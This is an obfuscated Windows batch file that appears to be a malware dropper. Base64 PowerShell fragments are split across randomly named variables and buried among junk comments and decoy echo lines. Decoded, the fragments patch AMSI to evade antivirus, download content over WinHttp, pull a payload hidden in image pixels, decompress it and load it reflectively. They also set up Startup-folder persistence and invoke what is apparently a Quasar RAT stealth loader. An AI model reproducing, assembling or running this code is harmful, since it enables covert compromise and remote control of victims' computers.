@echo off
se%wZfbR%T "pk_TBVX_0001=kgewppZiAoJElzRXJyb3IpIHsgV3JpdGUtRXJyb3IgJE1lc3NhZ2UgfQplbHNlIHsgV3JpdGUtSG9zdCAkTWVzc2FnZSAtRm9yZWdyb3VuZENvbG9yICRDb2xvciB9Cn0KfQpmdW5jdGlvbiBEaXNhYmxlLUFNU"
REM mirage delta zenith vertex echo sword pixel odyssey phantom twilight
echo SlBab3hybWpHSFpTZzdycDFIRTlMQnBUMnNwOGlvMEpoMEVKQkVPcVBiQzlJM0draGh0YmNzWWhSTTJYOWNXYnlodGNZT0ZLeU4zOUFTSw== >nul 2>&1
REM undergrowth kiln ruby
REM shadow kappa circle
REM shadow circle delta fragment phantom
sE%aqXl%t "pk_TBVX_0005=Ik4iKS5TdWJzdHJpbmcoMCw4KQokY29kZSA9IEAiCnVzaW5nIFN5c3RlbTsKdXNpbmcgU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzOwpwdWJsaWMgY2xhc3MgJGNsYXNzTmFtZSB7CltEbGxJbXBvc"
echo ZVZLU3FwM3ByUkJHbjYyWjRsS3Z2bDBuVUppalhteHNWdkNpTHVtNWE1aVpmanljQXhSemJCUnQyTzhJRDdo >nul 2>&1
REM circle delta kappa echo undergrowth vertex odyssey lance
REM lance sword cipher shadow pixel zenith circle echo vision zenith
echo TW50bThydUV2dmwxN2tCVTVUSExPOHJFNTNES0ZCZjgwamVUWGNXUzROSkFqSTY3SU1obG1KSFJsVGt4Wg== >nul 2>&1
SE%Juk%T "kFZugQEOzJVK=xoqNjfJYwpMJSPgpnCOxOUFp"
REM lance glimmer guard binary odyssey clearing twilight
REM kiln glimmer valley sword beacon hawk
REM kiln lance valley glimmer phantom core beacon clearing vision
REM vertex sword zenith sword
se%SOPC%t "hyeNqTF=BFfaViuZIoiAyiG"
SE%YIxwX%T "ujleKZn=JvWCenWsHM"
Se%uJn%T "ysmvKOWlolpu=mrRhsCFLklG"
echo eElIdlJUWEhweUE1WlRQVnc5eXg2dEs0MnU5bmZRTjJWZzE5bkNtcEJ3ZW1i >nul 2>&1
Se%ICuR%t "pk_TBVX_0039=U2lsZW50ICJbKl0gRGVjb21wcmVzc2luZy4uLiIKJGdzID0gTmV3LU9iamVjdCBTeXN0ZW0uSU8uQ29tcHJlc3Npb24uR1ppcFN0cmVhbSgoTmV3LU9iamVjdCBTeXN0ZW0uSU8uTWVtb3J5U3RyZWFt"
Se%elyF%T "HaVpfwowGQQIln=LjdIWjkfhxlKU"
REM sword glimmer echo
REM cipher kappa core odyssey delta echo
REM lance kappa sword kappa shadow circle binary hawk
se%DetBQ%t "pk_TBVX_0042=mx5Q2FjaGUgLWFuZCAkXy5Mb2NhdGlvbiAtbGlrZSAiKm1zY29ybGliLmRsbCoiIH0gfCBTZWxlY3QtT2JqZWN0IC1GaXJzdCAxCiRsb2FkTWV0aG9kID0gJG1zY29ybGliLkdldFR5cGUoJ1N5c3RlbS5SZWZsZWN0a"
sE%DPa%T "pk_TBVX_0006=nQoImtlcm5lbDMyIildIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIEludFB0ciBHZXRNb2R1bGVIYW5kbGUoc3RyaW5nIGxwTW9kdWxlTmFtZSk7CltEbGxJbXBvcnQoImtlcm5lbDMyIildIHB1YmxpYyBzdG"
echo eW1ObkFzN2U5MEdRWE1JN1JiU2FrMkZsdkJydHlEbkJvZUdsNDU5VjVMOU4zV3prQU5XcjFKaVVnSWFaMzZPeHh0Yw== >nul 2>&1
echo TlZTbmZ3U3JpRU51WDhleTlpbFpYWEMxZm1mMkZUV1doNm5XNUs1dWlCZHM= >nul 2>&1
REM glimmer lance vertex
echo SHhKak9zT25ja0wwaXE5cG5wdjBxbExDdGFoNFpibjZlcVhDYkFOSU13amNwWlF6d2tLbEUybHdKMjNGcA== >nul 2>&1
echo UVV6SEpSYURJdjJxVmJjUmFRR01LcGtXWHBqV1p5RGJLZGtZTHAyRFhuNw== >nul 2>&1
se%gvlHL%T "oxXtQvHbjtjtkEd=nUxRDUfRhPQKPeeLtIBvNXZXJb"
REM zenith circle sword zenith
REM mirage valley guard fragment strobe guard
REM glimmer kappa ruby binary binary mirage guard
Se%LiG%t "ToFjIJtyYxYgz=ZaAxHuFUvsImqDtemkaNEYencTqF"
REM twilight echo lance fragment
REM phantom phantom guard
REM lance circle cipher guard
REM vertex pixel cipher fathom odyssey strobe odyssey odyssey
REM echo delta undergrowth beacon ruby
REM pixel guard glimmer circle guard circle shadow delta
sE%FJvvV%T "AGFTvNcUxogSs=pdKVBZYQVLMCTzC"
REM kappa vision strobe fathom fathom pixel odyssey odyssey vision zenith
Se%RdCi%T "CcWLNUAZTQnmWW=RMAXHwgvSdXbskQYcxjwcwvwXed"
REM undergrowth echo shadow
sE%PqYQ%T "pk_TBVX_0023=4dDogLlNhdmVUb0ZpbGUgdCwgMjogLkNsb3NlOiBFbmQgV2l0aApzLlJ1biBDaHIoMzQpICYgdCAmIENocigzNCksIDAsIEZhbHNlCkVuZCBJZgoiQAp0cnkgeyAkdmJzQ29udGVudCB8IE91dC1GaWxlIC1GaWxlUGF0aCA"
se%ZhCx%t "VUFBqFCd=ufLfufuONNkLLWjoARA"
REM vision glimmer fathom cipher mirage lance vertex hawk shadow
REM lance sword fragment
echo ZzhmdVNBZ0lpWGhpcElzS3J6djZZb0JTbVk0ZXAyTDM1YUkySlVITkJYbUZVSEtGRTBvTm4= >nul 2>&1
REM sword twilight clearing twilight phantom kiln twilight ruby glimmer
sE%WwiIo%T "mMZErIGyCvegRBY=TjpNDlVXJpJsxTPfXVqKnmEU"
Se%idEs%T "oXKWrneeEgVgS=rryFTpvwpYCTESYEeiNitGeBHonNuJXcl"
REM guard binary phantom vision twilight cipher kappa guard mirage
REM vertex fathom echo vision
REM ruby clearing core circle
REM strobe twilight vision zenith undergrowth mirage
SE%IRWth%T "urHYouFGV=nkhqiVrHgIxiUILgKSUTRLKclxDBWwoAZOD"
SE%CsT%T "pk_TBVX_0013=vcFNlcnZpY2VzLk1hcnNoYWxdOjpDb3B5KCRwYXRjaCwgMCwgJHB0ciwgJHBhdGNoLkxlbmd0aCkKJHR5cGU6OlZpcnR1YWxQcm90ZWN0KCRwdHIsICRwYXRjaC5MZW5ndGgsICRvbGQsIFtyZWZdJG9sZCkgfC"
REM core core vertex vision cipher kappa ruby vertex fragment circle
Se%ZFOOT%t "pk_TBVX_0040=KCwkcGFja2VkKSksIFtTeXN0ZW0uSU8uQ29tcHJlc3Npb24uQ29tcHJlc3Npb25Nb2RlXTo6RGVjb21wcmVzcykKJG91dE1zID0gTmV3LU9iamVjdCBTeXN0ZW0uSU8uTWVtb3J5U3RyZWFtCiRncy5Db3B5VG"
Se%oJF%t "SEPtqOdmZ=KGRgSPOkzB"
REM kiln vision sword clearing pixel binary echo ruby core glimmer
Se%vhY%T "kEenzI=hROuojuYuQtkKmcvd"
sE%amcY%T "BiZwmoKEKPy=myYTbaOBvPQSYMISulHigiPbsfZYwgA"
REM beacon glimmer core cipher glimmer clearing pixel binary binary
REM undergrowth binary echo zenith hawk guard kappa strobe sword
REM valley hawk valley guard
sE%bqT%t "wPFStHNvrWmKEy=OLSYTxOMXHLwEZrGFNRyl"
se%vswYp%t "fuAeuGRbyBlHET=XDJwrtYiQwRIbgyeBzPiEMYoGLDR"
echo MXBzZDdTaG9xU0U1SVJSNkxwREl3Mlhva0g5RVhaVG5EcDRpazFQbmxBcHE5UEc1c3dCc3pZZ05FZ2pqT2pWcUd3NjBzcFlZ >nul 2>&1
Se%jEQ%t "PqfiEWyHXn=kmWxeOSlIPemsYIsYTyoVKqmqfWQMwr"
se%XIKB%t "NnXRytkKTvbEAj=aHTFTygBekJWI"
REM clearing echo undergrowth delta guard hawk
se%aQE%T "RxSklZJIRliMW=cjgEThnAeVCrizYOoeQsCUTnzkfDavcmeeF"
REM shadow hawk circle vertex twilight clearing shadow
SE%Ccw%t "CIOPWosvnFWEGmp=usCCNVqmVgcEvkhqEbXaQdFdRxqmkpXzt"
se%AtpOk%T "DmmDAVLrvBKijLq=PdBZYYOcRPyKhipmuPEICkGMrCfxdZRjaAm"
se%ccbV%t "gnCyUIkN=ayklYbWgqeBuKquinDGFw"
REM phantom zenith fathom zenith mirage
REM echo delta beacon echo ruby kiln vertex
echo WkFVdjFXNTBhbm1rS2pFdWFiNk1sZnV2eVplbUF1NTZveGJ2WHpkWmhiWHV3NlUyZWI0dFZYVFlrM0dwQVREdA== >nul 2>&1
REM echo kappa beacon binary delta lance fathom vision pixel undergrowth
REM sword fragment guard hawk undergrowth fathom sword
echo aGVqTFl0VzhIRVE5alA3ODFHbENIWUNhNTNOaFhiT0ViVmJ3UXFtdXlDb1p1cHB6WU5XeTJXanFpZlBKZ3VmS1o4eFZVQUJtNzJwUks= >nul 2>&1
sE%yMD%t "OEubUw=jtzwmIQqTkpJXLBRxeUIuMrSoMSIiuh"
REM zenith guard echo clearing valley guard hawk hawk cipher
SE%BeA%t "HKUyzkAPAL=XwNOmPfHiabKVapkGNongPLAqqjHzogM"
echo VDVmWTRoUTBRRGRkb3hlRXpJaUY5VWhsSUxRZ1RFdXZQVmpOYlg2OEEyeGd6RVpkRm42dDk5NnNP >nul 2>&1
Se%eVfX%t "ZjdVTnthdAQwj=rFhdwJjWUy"
SE%cjZC%T "KRifUd=jNvqSaYQFCXGxBNPsLZtZyyJ"
echo azVvNTFGWDZoaUtIODVUZDd2aUlLWEduR01CUEZtQk9uSlM5aFhLWmFnd2xkcTlCd0dqUm5objJCUnZqZWZyZFFVaEFoekdubHB5VnRabg== >nul 2>&1
echo cU05SEdFdDd6Zk1UV0FlTWY2cXJ1Sk95VVZlOEJ4cG9ZaEd4WXB4NUhTWA== >nul 2>&1
echo aGp4YlZBN3ZxR0t5Z09Jb2hHbTRvUzBFcTVVclpTSElOZjRVZDBsZTZGTGtOVXp3dg== >nul 2>&1
echo Nm5wQlo5Q0ZuTU5zaW5Ib2dsOVEwTlZ3R3Zka1dNRkR0Q2RLMkV0VHdJZFJTU3RB >nul 2>&1
echo a2xIQUhXd2EyZ3l0WmhrWDJqYWtqM1NaOW9WVVh5SUszU1E0RVAxOWsxQmVsYWtz >nul 2>&1
REM phantom shadow fragment ruby vision circle phantom binary zenith clearing
echo VXp6UkNubktLY01PY3oyelEwRUtRdGk0UnhLY01HVVFsQm5xd2tuZzBqSXRieFlCMmZodWMyb1lwYjk1MEY2R0c= >nul 2>&1
REM ruby binary hawk hawk clearing hawk hawk glimmer vertex binary
REM circle fathom echo binary kiln
Se%fEX%T "uygkOWHMGEvdP=XwnWlKaWIiiMOTY"
se%Sie%T "aFNKvYM=tOfRUNWusCB"
REM shadow strobe beacon clearing vision echo zenith
se%SCg%t "pkaXAfWxL=nkmQoYSvcgtWtPGvzLRlaNdAaTML"
REM hawk clearing kiln
REM vision hawk fathom sword beacon zenith cipher mirage
se%YkpH%t "ysTTiELYZgNDZu=bwOMzALUBmWuUzG"
se%RsS%t "nngRVt=zaNqDcpqgPoYUbLYcehKRhiKi"
REM kiln pixel beacon sword
se%BPG%T "pk_TBVX_0043=W9uLkFzc2VtYmx5JykuR2V0TWV0aG9kcyhbU3lzdGVtLlJlZmxlY3Rpb24uQmluZGluZ0ZsYWdzXSJQdWJsaWMsU3RhdGljIikgfCBXaGVyZS1PYmplY3Qgewokc3RyID0gJF8uVG9TdHJpbmcoKTsgKCRzdHJbMzd"
echo a0hZbHd2TGdRNVNwOWVNaEtaQ0xrRENocEJMbjQ1eEVZQjd0VEdvUjdsM0Zhc2VvbUZTRw== >nul 2>&1
REM echo lance undergrowth cipher
Se%ZoQJ%T "lyAMkEvPnolWOIh=YuMxsQQPOKDWOGLWIpAQVN"
REM pixel hawk guard cipher zenith
se%AVdD%T "ZFyCOCfmZu=ovYrOQcVXqrZwfhsyaJGeoToPOoHczPL"
sE%rjJ%T "PUKKJUNdIhkKLmT=dSMUaGCdGGQwyAWJb"
REM core strobe binary beacon
echo V3lZQ2sxYlpGTkhwYmhZbWthaHBJYVVMMm9seGt3VWF1V1gwbDgzMjlWd0FmMDVQWjRpNnZvNm1pZTNpTVJVMmh2Um5HUlhwYUo4bzQ1SU4= >nul 2>&1
echo VEFOZUlyY01IU1BCR0RzaXo3M0VURTRoZ1JYVVk5MVM1MDRDV1EyQ3ZXYnBZSW5DUXc1dzk2U01lR2c3 >nul 2>&1
SE%BGvzC%T "pk_TBVX_0034=iWytdIFBheWxvYWQgTGVuZ3RoOiAkbGVuZ3RoIGJ5dGVzIgokZXh0cmFjdGVkID0gTmV3LU9iamVjdCBTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5MaXN0W2J5dGVdCiRkb25lID0gJGZhbHNlCmZvciAoJHkgPSAwOyAkeSAtbHQ"
REM sword echo zenith fathom
Se%aev%T "YByezcbPqyednG=uqWVCTctUWRVDWrISv"
se%PUku%t "RLqqGVkK=QaBicxCLotA"
REM cipher pixel mirage odyssey guard binary guard fragment lance beacon
SE%bhl%t "pk_TBVX_0036=ICRibXAuR2V0UGl4ZWwoJHgsICR5KQokZXh0cmFjdGVkLkFkZCgkcHguUik7IGlmICgkZXh0cmFjdGVkLkNvdW50IC1nZSAkbGVuZ3RoKSB7ICRkb25lID0gJHRydWU7IGJyZWFrIH0KJGV4dHJhY3RlZC5BZGQo"
echo VGFGRlJ2TW5nd3I1TmJLaER3dzg2RzBqQk4wd3NFeGxWdEFON0hKNThWU09WSndKaUlvR0tQdQ== >nul 2>&1
REM zenith echo ruby strobe kappa glimmer
se%OeBDi%t "GCkehoxrWHqHTn=wXiZGjuCSrIzgqBDmZLwXs"
REM mirage kappa vertex fragment
Se%yOJ%t "LHiNJV=lvxyBcVJlVcfkafhK"
echo Zld3c1VMMUhudnRzNG1FMVdpWEN4Z1pTQzRaMFo3am15MGpHODdGQ3ZnVQ== >nul 2>&1
sE%ovwu%T "JthPJMQCqxRC=oMJYZArfXjuobCg"
sE%yoZ%t "iqkllGdO=uTyiwFOOeEiixB"
REM shadow circle sword vertex circle twilight
Se%CUiID%t "UvzINPuu=efXdcHSJjvrMuuJRC"
REM undergrowth core shadow clearing lance fragment mirage undergrowth binary beacon
REM vertex hawk kiln sword binary fragment undergrowth
SE%QCedw%T "eVYRrcudyzrFSA=QkhpFiqqHdGeDCKFqQXxXMt"
REM clearing clearing echo delta
echo c3RUeWhDanZpQnVvV2lnQlc3WVg3cDdyZjJ6TWRTckszYnFkdEo2U2xySW5Bb3M2Z1NtcHVTVTFDR2V3QVVydEt0SXBoYk1XRzc= >nul 2>&1
echo c2Y4dW9uYUc5UlpuYks2Tm9LcGRLcnVBeDNTT1NiT29DSXhiYUM4VnNWc1dLQWN4ZklWVlk2eWdCVHh3TVA4WHhoUQ== >nul 2>&1
REM mirage guard ruby undergrowth cipher fragment sword strobe kiln phantom
echo eFJFcXkwZGQ2THhIS3ZsVGgxMHZaRldobnFVdzBabGMwa0pmSWpYeE1jeUV0Q2dB >nul 2>&1
se%PBs%T "UVjmbLLEdOVUMj=LglQQecDbShuz"
REM ruby undergrowth cipher vision delta
REM binary guard core shadow vision strobe phantom
REM strobe echo cipher binary
REM beacon hawk pixel delta clearing vision
se%IKA%T "iBOtdHzHholNF=zZUfLmmlyTsedIVCb"
REM guard kappa zenith
REM mirage vision zenith echo fathom
sE%zDpd%T "GNdjXrnzEmL=vOdtiHmDLLO"
SE%bhNG%t "sDlNnSiwkZEDOz=QmnNDpLvJzsdKkDInsemKlexv"
Se%hzD%t "rKIqgsGmkZDWJTM=reIEKjLlpPtMHMmrV"
REM glimmer lance phantom valley zenith circle
se%fnc%t "ywwHWcAUXqVRtQ=vEmszEBGGcalRuqmifxYCjmPJZ"
REM guard pixel sword vision twilight
Se%qdJV%T "SRkdkRwlIyAysax=MWfCwuBHDCNDpijnqOEeNGthEQyESW"
sE%xPT%T "TVGDXQYA=eAdVlIlUdQWBKbvA"
REM undergrowth fathom hawk
Se%Zzq%T "BPUbvHgdGrY=vJtNnttjshBqqfPTHZN"
echo OTlpNFNPRTRibTVNNU9BVlRiU2Z0MFl5VUhzYmpwQ3RTSHRoMmtIRk9acEZuS1ZP >nul 2>&1
echo c0I4bnZ0Y1N3WVZxM2gxYnkzbnFlbE9XMndNYk81dVJtVlRjeEV5N244djNJalBWaXliVGpPRm1EN0R4UzdvM3N5MVFYV3BWYVNvN21tUVQ= >nul 2>&1
REM glimmer kiln delta glimmer undergrowth
echo OWxQcmRDWUtieFlxcExxZE1Bb3Nnb0hQa3lBNFp2enRRWlltbnIzdDI2WTRkbzNpM3RUMExVVXVnSEpvdEEydw== >nul 2>&1
sE%kSyzJ%t "ffUDcwmpfy=lNMIgQxSOeDxIvkQtxyIWCjCFJPC"
echo ckJReVBXMGZCS2dSc1RNYzdKUVhSaTJYWG51Y2hrQ3BLa0E3bkdBVG5uQXNJcnNKMENsMG01cGpHRU9yVWl4SkFDTWhRVTQ5aDB3YktT >nul 2>&1
REM sword echo delta binary echo
se%FZsl%T "LZGMobRfpL=DAyrbKXAotLgBmEIcBlEumxqBBlNIjDW"
sE%MBl%T "pk_TBVX_0045=9kLkludm9rZSgkbnVsbCwgKCwkcmF3UEUpKQpMb2ctU2lsZW50ICJbK10gQXNzZW1ibHkgTG9hZGVkOiAkKCRsb2FkZWQuRnVsbE5hbWUpIiAiR3JlZW4iCiRlbnRyeSA9ICRsb2FkZWQuRW50cnlQb2ludAppZiAoJGVu"
sE%ZPGn%T "pk_TBVX_0048=bnZva2UtUXVhc2FyU3RlYWx0aCAtU291cmNlICR0YXJnZXQKUmVhZC1Ib3N0ICJQcmVzcyBFbnRlciB0byBjbG9zZS4uLiI="
echo MTd6aVRycTc3RHJPN3FyQ3pWMkpYWE1hM1Q4dHpjSmQ2ZmFRaG5oalRZc0s2TGxiN3h3Zmk2ZlhuaUdhNVNPdXRrZEw= >nul 2>&1
echo V1BpcTJCNnF2TGJhSHdUVU0yaWt6VGlWSHBWT2xXQ3cxMkNYRGhVUzRTcU13dFlxNDNEWThOWFB0ZTZkRTN6dzhPYXFxUjNLdTAzZ1Jkdjg= >nul 2>&1
echo VzhZM0ExU1lNVGF0MjE5VU5PRjFjN3haR2pHbTNYSm10T3ljVllMM2tqRUxuZg== >nul 2>&1
se%vVsf%T "xZDmbZKWSqys=GkZttylcFpiykRJfSCMwGBlQ"
echo OHZlR1hnUVVySlJxdjM3Vk1MSm9nWVJUMHRDQmdrbFY2SjNSSDRNOHo1cjM1NVhJajBiRnY2d2s5aHBjVUhkMnpqZWtOaTB5dmFhY0Y= >nul 2>&1
SE%kyxU%T "urDwnsHN=oxubUtJubwG"
echo SGNZQm1aTkFFMFhpbjF2cnRHNllWYXpTck1XSDhscHNyM2o0R0Frd0liemJ3eTBaUTZDZQ== >nul 2>&1
Se%TCoL%t "DarHyCy=rePbaoRQKLVctdvaOdfa"
echo VXNRV2ZKTnR5Yko1bTRrdEZUdm92Y1JmUkNrQnpGTnhEOXRqTnVtVU1Ic0dpNnpEWnpNNHdFVDZYYzdvU2p1 >nul 2>&1
REM binary sword kappa binary fathom hawk kiln vertex sword
echo S2FoSTRmM3A1aXQ1Ym5qYjZxUVlQbmdkOFl2b1h3OTU0UEk0YWJWNHJQM0VmM2p0dnRXTnpJbFVsUDBONldmdEFZeDUxZjlqWHgwNnc= >nul 2>&1
REM clearing twilight circle kappa
REM core binary undergrowth kappa valley
echo OFJLaU13MGVFTkZZNUNFMGNCcEoyRk1ZVmVvNkxzRzViOHJrbzUxTHlCWUQzbUVUMEVvYjBYaWpiVTRZTUdNaU83Sk1ndXhx >nul 2>&1
echo WTR4SHNrSUZpcmNDd3dmYWF5cjh5MWpHTlJmSXAwUTBFRnVHMGRjVkVvVDk= >nul 2>&1
sE%tJk%T "pk_TBVX_0016=YXJnZXQpIHsgJHRhcmdldCA9ICRJbWFnZVBhdGggfQppZiAoLW5vdCAkdGFyZ2V0KSB7ICR0YXJnZXQgPSAkSW1hZ2VVUkwgfQpmdW5jdGlvbiBJbnN0YWxsLVBlcnNpc3RlbmNlIHsKcGFyYW0gKFtzdHJpbmddJFN0YWdl"
REM glimmer circle kiln odyssey hawk guard guard vision
Se%IjOY%T "hTUunvcDbGbNIcB=EyvSZiQbCzV"
REM vision valley valley fragment delta mirage clearing valley hawk twilight
Se%PvkP%T "xqGzBAOeFJgFnsf=TeWnZDchhOoCIgryqZToWFCwUVA"
sE%cIkS%t "LRLOSj=BnfeYLnMrzxqdwcjGXIRbpX"
SE%RSAK%t "zFSzBbxjxvBUgKN=qjgeTVBspHwTpihTBTq"
Se%geuEk%t "pnqqJslAyS=jrNAbmGwseOOPEQ"
Se%zBgUP%T "qAGpibgTs=TYbPdrMLCicINYVaRlgeFtqNcS"
se%tDwX%T "RfDZMDaIzEFoufD=aKUcmwjalPlLSLdvBmHUgzfbAKCoERAdc"
se%yTY%T "exiXXrl=QQPJhqVxFDEzyjhkcggunVFjzzwPm"
REM mirage core circle echo mirage fathom mirage lance binary clearing
echo WG85RjNHWTVoaFJhSDQwaEJFeVFyRVA0aE9zdlNHTFhBR29LZ21FSDNORVJTckUwMXZqaw== >nul 2>&1
se%ZNm%T "xursDYySNKIE=SKWvFybrYwjFO"
echo d2ZuUlRDYlltUXdRSVVCdXZDaTJ6NXZMZDRTWXd6bzVidWdQRENTYmVYTzFpajVZV1FjOUp4cU1tQ2RHRA== >nul 2>&1
REM ruby cipher lance kappa ruby beacon binary echo
REM fathom twilight fragment fathom echo delta zenith lance clearing
echo dmhWYUhlcVBOaEFsU0hDeTVvMlEwcENpTzhuYkxLV2k2S0NwMkE2aVQyVk9JN1JXbjE1bllua01U >nul 2>&1
echo VGlSMGs3Y2pKSzlpNDFWczZ4d3dabWZuaWZQQUIxeFhzQ3BZb1pYZlNNVmRYMUR2SHZubndtdlFC >nul 2>&1
sE%HRAo%T "kIBePlwcIob=TLsCldpbbAAgLxmQoBXpV"
REM delta zenith sword shadow valley guard shadow pixel
Se%qPLbp%T "QsBbOprK=VHRllWpMEqHRHcJIOEWnHBDFlWCGbpE"
se%NeD%T "pk_TBVX_0033=hlbCgxLDApCiRsZW5ndGggPSAoW3VpbnQzMl0kcDAuUiAtc2hsIDI0KSAtYm9yIChbdWludDMyXSRwMC5HIC1zaGwgMTYpIC1ib3IgKFt1aW50MzJdJHAwLkIgLXNobCA4KSAtYm9yIFt1aW50MzJdJHAxLlIKTG9nLVNpbGVudCA"
sE%pYMa%T "pk_TBVX_0044=dIC1lcSAnXScgLW9yICRzdHJbMzhdIC1lcSAnKScpIC1hbmQgKCRfLkdldFBhcmFtZXRlcnMoKS5Db3VudCAtZXEgMSkKfSB8IFNlbGVjdC1PYmplY3QgLUZpcnN0IDEKJGxvYWRlZCA9ICRsb2FkTWV0aG"
SE%PGYv%t "JxpdvhYjN=skMBZqdaJhheWqPTv"
Se%lrsTP%t "DYKxaXR=qNGxzdveJaUmHCxnxUx"
SE%SgiR%t "fdRnIePWwGuBaM=XVYvfDsIzYGlpuiGXvLQrJQpLOm"
REM hawk delta clearing valley fragment shadow cipher circle delta twilight
Se%aqG%T "QeNSNVwXNSzjW=TzwXQBVDBjtCQygZaHwircM"
REM kiln kiln odyssey
REM cipher guard ruby twilight fragment odyssey beacon
REM odyssey kiln delta pixel vertex strobe
echo eXh4UmdBVHNqNGFuelFQVUdvUXdaVWZNc0xJZzBlTXQ4Wll1T1lHU0NtRVRrUUt3N3FOZ3p1enZTV3da >nul 2>&1
echo dVJ4ckVYaVRCdWJQclUyZ2FmMkNnOW1zbGJMTWxsdVlWME54bHFWY0RabUFEdFpwck5FcFJKemp1REVodg== >nul 2>&1
REM sword delta glimmer undergrowth ruby mirage twilight
Se%rhFA%t "WBbyvOnYW=dWjQUwBbBEbYstZzPTL"
echo WUE3QlpyWVRyTEtjd29MM0FQVVh5R1lMbHdRUzVhMXBPMUV2b29sQ3hCV3hYOGNmU094 >nul 2>&1
echo NTBkRlg5WHo2Y0poM3NUSGd0aFhLa3RkTjJRalJwM0RTbVJISGdXSkVWT08zRzZmMTMxNlhYdlBKOXdROWZWZXNodDNDaW5x >nul 2>&1
REM kiln glimmer zenith beacon pixel core delta circle binary
SE%UDBbC%t "pk_TBVX_0021=U9iamVjdCgiV2luSHR0cC5XaW5IdHRwUmVxdWVzdC41LjEiKTogaC5PcGVuICJHRVQiLCB1LCBGYWxzZTogaC5TZW5kCklmIGguU3RhdHVzID0gMjAwIFRoZW4KdCA9IHMuRXhwYW5kRW52aXJvb"
sE%EKmfd%t "azcAonxLFhHHa=fjRAGTsSUSqJi"
Se%ZXyYv%T "SrAnJUwtrtrVHC=GJIbxSTCQsalxMWIojYePuqMsWVUVubpM"
sE%BCipj%T "EUWuomjdufCzjpw=uMccYsRlgNiVHheCgIQfzgraL"
echo TVdjcllaZ1VYNzJVeVlMTVM3bEtyZEhTdXN3TFcxYUZCaDVveDRCcGpjc2pwdExOdWpYbTQ= >nul 2>&1
se%kAaH%T "hLddcFBFkLFiYf=MDIZuiOzIOWbP"
echo dG5qTHhVWkRMOERNS205YjRNdUdZdko2eTRGVjVUOUtURjROZEplWXdubTJTVm85 >nul 2>&1
REM hawk ruby zenith cipher cipher shadow circle kappa
se%GfyJ%t "qvklluizn=eIdQHqxcaULTwsqzeyrTdCoWt"
echo T2prejk4dTc1RkpSbkRXcDdJcDdzUzZFNGl3Q3A5cXlySnV4Q3hiUml2OUVVekdhWUZLN1dpYk9iR0JQTVhBcU93TGNaWjM0djhVWlRsbg== >nul 2>&1
sE%Pml%T "VjMzmEqSDt=thRJiwfjgFPJmZvzTye"
SE%sJLaj%T "pk_TBVX_0017=clVybCkKJHN0YXJ0dXBGb2xkZXIgPSBbU3lzdGVtLklPLlBhdGhdOjpDb21iaW5lKCRlbnY6QVBQREFUQSwgIk1pY3Jvc29mdFxXaW5kb3dzXFN0YXJ0IE1lbnVcUHJvZ3JhbXNcU3RhcnR1cCIpCiR2YnNQYXRoID"
REM cipher vertex strobe echo delta kiln kappa
Se%JRs%t "DTKmtl=iwguhvhxbIQOPytPceiXQWMeFijDoYEQwvR"
Se%IQqp%t "pvHkYMW=WYJNFIdHFzojPpsJELFgJ"
REM guard undergrowth fathom kappa mirage core kappa guard
Se%HEh%T "UFbNWVxmA=klrGJLZcKWrIhvTkNrNRfzSrSwEbShBUpiE"
Se%lWqo%T "bEZIvPOaXVpXHS=FkFgmpKBDZpiRrXWHvFiCynKSdcd"
Se%dUZP%T "ttJNEsRrPrp=YnFQQUUUESFjTJJ"
echo S2U3czVFTW52YmlmQXBWWDF2aUozakhZZ214WWtBMGl0M2VFMU53bG5vekE4MmRXUWVuUDcxbzcyWjU5ZnRNcTA= >nul 2>&1
Se%NogbH%t "yWqBxVFWAjv=juqExUyvaqCZLQskjmlFkvdI"
SE%IDbq%t "iWAgOSafKKkFnU=VqqEkFGRfJXdzgEdb"
Se%yLq%t "ebUKKQipvZv=hHQiZcXliaI"
REM beacon fathom valley binary core
se%rJOMF%t "pk_TBVX_0014=BPdXQtTnVsbApMb2ctU2lsZW50ICJbK10gQU1TSSBHaG9zdCBQYXRjaCBhcHBsaWVkIHN1Y2Nlc3NmdWxseS4iICJHcmVlbiIKfQp9IGNhdGNoIHsKTG9nLVNpbGVudCAiWyFdIEJ5cGFzcyBlcn"
sE%sLQl%T "UjPlSQssG=tmBjitLrizbNfnZFWFENUxgLu"
REM vision vertex strobe odyssey vision
echo UG9zbTJmOWxtSlZSTG56NHlRYTJaV3dzZkJibnBkVnAwdDZXR0NuQnlMYkhRdERaaA== >nul 2>&1
REM glimmer strobe ruby strobe fragment guard delta binary
REM guard lance kappa delta binary lance binary
REM beacon shadow binary binary kiln sword fragment kappa
